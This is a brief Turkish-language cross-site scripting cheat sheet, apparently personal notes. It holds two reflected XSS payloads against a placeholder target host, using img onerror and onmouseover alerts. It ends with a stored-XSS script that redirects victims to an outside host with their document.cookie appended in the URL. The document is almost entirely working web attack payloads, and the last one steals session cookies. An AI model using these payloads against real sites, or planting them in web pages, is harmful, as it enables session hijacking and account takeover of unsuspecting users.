***XSS***

//klasik alert
http://hedefip/xss3.php#<img src='xxx' onerror=alert(1)>

//image'a src veril mause üzerine geldiğinde alert verme
http://hedefip/xss3.php#<img src='http://ss.com/geyik-300x279.png' onmouseover=alert('hacked')>

//xss stored cookie çalma
<script>window.location ="http://10.47.172.59/nightwatch.php?"+document.cookie</script>
